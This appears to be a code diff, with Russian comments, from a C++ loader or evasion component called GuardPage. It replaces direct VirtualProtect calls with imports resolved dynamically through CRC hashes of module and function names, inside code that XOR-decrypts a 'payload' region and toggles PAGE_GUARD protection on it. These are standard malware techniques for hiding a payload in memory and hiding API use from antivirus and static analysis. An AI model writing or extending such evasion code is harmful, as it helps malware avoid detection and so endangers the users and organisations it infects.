@@ -150,9 +150,17 @@ namespace GuardPage
         // Определяем диапазон нашего модуля для RIP-проверки
         DetectOurModule();
 
+        // Динамическое разрешение VirtualProtect
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return;
+
+        typedef BOOL (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+        pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+        if (!pVirtualProtect) return;
+
         // Применяем PAGE_GUARD к payload-региону
         DWORD oldProtect;
-        VirtualProtect(payloadBase, payloadSize,
+        pVirtualProtect(payloadBase, payloadSize,
                        PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
     }
 
@@ -169,9 +177,19 @@ namespace GuardPage
                 XorPayload();  // XOR повторно = расшифровка
             }
 
-            DWORD oldProtect;
-            VirtualProtect(gPayloadBase, gPayloadSize,
-                           PAGE_EXECUTE_READ, &oldProtect);
+            // Динамическое разрешение VirtualProtect
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (hK32)
+            {
+                typedef BOOL (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+                pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
+                if (pVirtualProtect)
+                {
+                    DWORD oldProtect;
+                    pVirtualProtect(gPayloadBase, gPayloadSize,
+                                   PAGE_EXECUTE_READ, &oldProtect);
+                }
+            }
         }
 
         gPayloadBase    = nullptr;
